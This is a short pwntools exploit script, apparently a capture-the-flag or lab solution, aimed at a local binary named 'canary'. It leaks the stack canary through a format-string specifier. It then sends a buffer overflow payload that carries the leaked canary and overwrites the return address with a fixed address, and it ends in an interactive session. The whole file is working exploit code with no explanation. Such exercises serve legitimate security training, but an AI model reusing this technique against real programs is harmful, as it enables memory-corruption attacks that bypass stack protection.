from pwn import *

p = process('./canary')

log.info(p.clean())
#leak by format string
p.sendline('%23$p')
# convert canary from string to int
canary = int(p.recvline(), 16)
log.success(f'Canary: {hex(canary)}')

#write payload
payload = b"A" * 64
payload += p32(canary)
payload += b"A" * 12
payload += p32(0x08049245)

p.sendline(payload)
p.interactive()